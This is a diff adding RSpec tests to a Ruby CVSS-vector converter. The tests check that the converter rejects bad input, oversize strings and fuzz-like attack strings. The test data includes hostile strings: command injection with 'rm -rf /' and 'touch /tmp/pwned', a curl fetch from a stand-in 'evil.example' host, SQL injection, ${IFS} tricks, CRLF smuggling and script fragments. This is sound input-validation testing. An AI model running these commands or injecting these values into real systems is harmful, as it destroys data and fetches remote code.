@@ -225,11 +225,78 @@ RSpec.describe CvssTo31 do
       end
     end
 
+    context 'with a non-String, non-CvssSuite input' do
+      let(:input) { Object.new }
+
+      it 'raises a descriptive CvssTo31::Error' do
+        expect { convert }.to raise_error(CvssTo31::Error, /String or CvssSuite/i)
+      end
+    end
+
+    context 'with an oversize CVSS string' do
+      let(:input) { 'CVSS:3.1/' + ('A' * 2048) }
+
+      it 'raises a descriptive CvssTo31::Error before parsing' do
+        expect { convert }.to raise_error(CvssTo31::Error, /too long|1024/i)
+      end
+    end
+
+    context 'with illegal characters in a CVSS vector' do
+      [
+        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H%0A',
+        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`touch /tmp/pwned`',
+        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H;rm -rf /',
+        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\\x00',
+        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n',
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'"
+      ].each do |bad_input|
+        it "rejects #{bad_input.inspect}" do
+          expect { described_class.convert(bad_input) }.to raise_error(CvssTo31::Error, /invalid.*cvss|allowed/i)
+        end
+      end
+    end
+
+    context 'with simple fuzz-like attack strings' do
+      [
+        '"; DROP TABLE users; --',
+        "$(curl http://evil.example/payload)",
+        'hello%00world',
+        'A' * 512 + '%',
+        'MALICIOUS`COMMAND',
+        'X' * 2000,
+        "${IFS}CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:${IFS}H',
+        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\r\nGET /admin HTTP/1.1",
+        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H;alert(1)',
+        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<!--script-->'
+      ].each do |fuzz|
+        it "fails closed for #{fuzz.inspect}" do
+          expect { described_class.convert(fuzz) }.to raise_error(CvssTo31::Error)
+        end
+      end
+    end
+
     context 'with an unsupported CVSS version' do
       it 'raises CvssTo31::UnsupportedVersionError' do
-        # Use a plain double to simulate a hypothetical future CVSS version
-        # without being constrained to a specific CvssSuite class interface.
-        fake = double('CvssSuite::Cvss', valid?: true, version: '5.0')
+        fake_class = Class.new(CvssSuite::Cvss) do
+          def initialize(vector)
+            @vector = vector
+          end
+
+          def valid?
+            true
+          end
+
+          def version
+            '5.0'
+          end
+
+          def vector
+            @vector
+          end
+        end
+
+        fake = fake_class.new('CVSS:5.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N')
         expect { described_class.convert(fake) }.to raise_error(CvssTo31::UnsupportedVersionError)
       end
     end
